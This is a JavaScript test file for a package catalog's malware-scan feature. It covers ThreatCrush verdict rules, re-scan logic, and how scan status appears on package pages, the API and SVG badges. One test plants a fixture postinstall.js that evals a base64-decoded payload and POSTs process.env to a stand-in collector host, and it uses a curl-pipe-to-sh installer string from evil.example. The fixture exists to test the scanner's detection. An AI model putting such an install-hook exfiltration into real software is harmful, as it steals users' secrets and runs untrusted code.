import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { openStore } from '../src/store.mjs';
import { startServer } from '../src/server.mjs';
import { createScanner, scanPackage, verdict } from '../src/scan.mjs';

const ID = 'moshcode.sh/moshcode';
const report = (findings = []) => ({
  tool: 'threatcrush',
  version: '0.13.29',
  filesScanned: 3,
  summary: { critical: 0, high: findings.length, medium: 0, low: 0, info: 0 },
  findings,
});
const finding = (ruleId, extra = {}) => ({
  ruleId,
  title: ruleId,
  severity: 'high',
  file: 'source/repo-abc123/src/index.js',
  line: 7,
  ...extra,
});
// A fetch that serves an installer, a commit sha and an optional source tarball.
function fakeFetch(state) {
  return async (url) => {
    const body = url.includes('api.github.com')
      ? state.commit
      : url.includes('codeload.github.com')
        ? state.tarball
        : state.installer;
    if (body === undefined) return new Response('missing', { status: 404 });
    return new Response(body);
  };
}

test('verdict: only malware rules flag a package; ordinary findings stay notes', () => {
  const passed = verdict(report([finding('sh-remote-script-execution')]));
  assert.equal(passed.status, 'passed');
  assert.equal(passed.malware, 0);
  assert.equal(passed.findings[0].file, 'source/src/index.js');
  for (const rule of [
    finding('js-encoded-payload-execution'),
    finding('js-environment-exfiltration'),
    finding('some-future-rule', { cwe: 'CWE-506' }),
  ]) {
    const flagged = verdict(report([finding('weak-hash'), rule]));
    assert.equal(flagged.status, 'flagged', rule.ruleId);
    assert.equal(flagged.malware, 1);
    assert.equal(flagged.findings[0].malware, true, 'malware findings sort first');
  }
});

test('verdict: a malware rule ThreatCrush softened to low (a test fixture) does not flag', () => {
  // threatcrush 0.13.48 was flagged for its own false-positives.test.ts fixtures.
  const fixture = finding('js-environment-exfiltration', {
    severity: 'low',
    file: 'source/repo-abc123/packages/scan/src/__tests__/false-positives.test.ts',
  });
  const passed = verdict(report([fixture]));
  assert.equal(passed.status, 'passed');
  assert.equal(passed.findings[0].malware, false);
  const real = verdict(report([finding('js-environment-exfiltration', { severity: 'medium' })]));
  assert.equal(real.status, 'flagged');
});

test('scanner scans once, re-scans only when the installer or version changes', async () => {
  const store = await openStore({ path: ':memory:', seed: false });
  const entry = await store.package(ID);
  const state = { installer: '#!/bin/sh\necho one\n', commit: 'a'.repeat(40), tarball: undefined };
  let runs = 0;
  const scanner = createScanner(store, {
    fetch: fakeFetch(state),
    threatcrush: async () => {
      runs++;
      return report();
    },
    log: () => {},
  });
  try {
    assert.equal(entry.scan.status, 'pending');
    await scanner.check(entry);
    assert.equal(runs, 1);
    const scanned = await store.package(ID);
    assert.equal(scanned.scan.status, 'passed');
    assert.equal(scanned.scan.sources.commit, 'a'.repeat(40));
    assert.ok(scanned.scan.notes[0].startsWith('Source not scanned'), 'tarball 404 is a note');

    await scanner.check(entry);
    assert.equal(runs, 1, 'unchanged package is not re-scanned');

    state.installer = '#!/bin/sh\necho two\n';
    await scanner.check(entry);
    assert.equal(runs, 2, 'new installer bytes trigger a re-scan');

    state.commit = 'b'.repeat(40);
    await scanner.check(entry);
    assert.equal(runs, 3, 'a new repository commit triggers a re-scan');

    // A new catalog version shows as pending until its own scan lands.
    const bumped = { ...entry, latest_version: '999.0.0' };
    const listed = (await store.packages('moshcode')).find((item) => item.id === ID);
    assert.equal(listed.scan.status, 'passed');
    assert.equal(
      (await store.packages('')).find((item) => item.id === ID).scan.version,
      entry.latest_version,
    );
    await scanner.check(bumped);
    assert.equal(runs, 4, 'a new version triggers a re-scan');

    // An unreachable installer keeps the last good result.
    state.installer = undefined;
    const kept = await scanner.check(bumped);
    assert.equal(kept.status, 'passed');
    assert.equal(runs, 4);
  } finally {
    await store.close();
  }
});

test('real ThreatCrush run over a downloaded source tarball flags a planted payload', async () => {
  const work = mkdtempSync(join(tmpdir(), 'w3bs-scan-test-'));
  try {
    const repo = join(work, 'evil-repo-0123abc');
    mkdirSync(join(repo, 'lib'), { recursive: true });
    writeFileSync(
      join(repo, 'lib', 'postinstall.js'),
      "const payload = process.argv[2];\nconst code = Buffer.from(payload, 'base64').toString();\neval(code);\n" +
        "fetch('https://collector.example/', { method: 'POST', body: JSON.stringify(process.env) });\n",
    );
    const archive = join(work, 'source.tar.gz');
    assert.equal(spawnSync('tar', ['-czf', archive, '-C', work, 'evil-repo-0123abc']).status, 0);
    const result = await scanPackage(
      {
        id: 'evil.example/evil',
        latest_version: '1.0.0',
        install: 'curl -fsSL https://evil.example/install.sh | sh',
        repository: 'https://github.com/evil/evil',
      },
      {
        fetch: fakeFetch({
          installer: '#!/bin/sh\nnpm install -g evil\n',
          commit: 'c'.repeat(40),
          tarball: readFileSync(archive),
        }),
      },
    );
    assert.equal(result.status, 'flagged');
    assert.ok(result.malware >= 1);
    assert.ok(
      result.findings.some((item) => item.malware && item.file === 'source/lib/postinstall.js'),
      JSON.stringify(result.findings),
    );
    assert.match(result.scanner, /^threatcrush \d/);
  } finally {
    rmSync(work, { recursive: true, force: true });
  }
});

test('package page, list, JSON API and SVG badge show the scan state', async () => {
  const store = await openStore({ path: ':memory:', seed: false });
  const instance = await startServer({
    store,
    port: 0,
    publicOrigin: 'http://localhost:3000',
  });
  const origin = `http://127.0.0.1:${instance.server.address().port}`;
  const get = (path) => fetch(`${origin}${path}`, { headers: { host: 'localhost:3000' } });
  try {
    let page = await (await get(`/packages/${ID}`)).text();
    assert.match(page, /ThreatCrush · Scan pending/);
    assert.match(await (await get(`/api/packages/${ID}/badge.svg`)).text(), /scan pending/);

    const entry = await store.package(ID);
    await store.recordScan(ID, {
      ...verdict(report([finding('js-encoded-payload-execution')])),
      version: entry.latest_version,
      fingerprint: 'f',
      sources: { installer: 'https://moshcoding.com/install.sh', installerSha256: '0' },
      notes: [],
      scannedAt: '2026-10-13T12:00:00.000Z',
    });
    page = await (await get(`/packages/${ID}`)).text();
    assert.match(page, /ThreatCrush · Malware flagged/);
    // The page leads with the w3bs CLI; the publisher's curl is the secondary route.
    assert.match(page, new RegExp(`INSTALL</span><code>w3bs install ${ID}</code>`));
    assert.match(page, /Publisher's installer<\/dt><dd><code class="break">curl /);
    // "What do I type?": step 1 is w3bs install, then the tool's own commands.
    const usage = page.slice(page.indexOf('<h3>Get started</h3>'), page.indexOf('id="scan"'));
    assert.match(usage, new RegExp(`<li><div><code>w3bs install ${ID}</code>`));
    assert.ok((usage.match(/<li>/g) || []).length >= 3, usage);
    assert.match(usage, /<code>moshcode --help<\/code>/);
    assert.match(page, /Malware indicator/);
    assert.match(page, /source\/src\/index\.js:7/);
    const badge = await get(`/api/packages/${ID}/badge.svg`);
    assert.equal(badge.headers.get('content-type'), 'image/svg+xml; charset=utf-8');
    assert.match(await badge.text(), /malware flagged/);
    const json = await (await get(`/api/packages/${ID}`)).json();
    assert.equal(json.scan.status, 'flagged');
    assert.equal(json.scan.findings.length, 1);
    assert.equal(json.scan.fingerprint, undefined);
    const list = await (await get('/packages')).text();
    assert.match(list, new RegExp(`href="/packages/${ID}"`));
    assert.match(list, /ThreatCrush · Malware flagged/);
    assert.equal((await get('/packages/nope.example/nothing')).status, 404);
    assert.equal((await get('/packages/%E0%A4%A/x')).status, 404);
  } finally {
    await instance.close();
  }
});
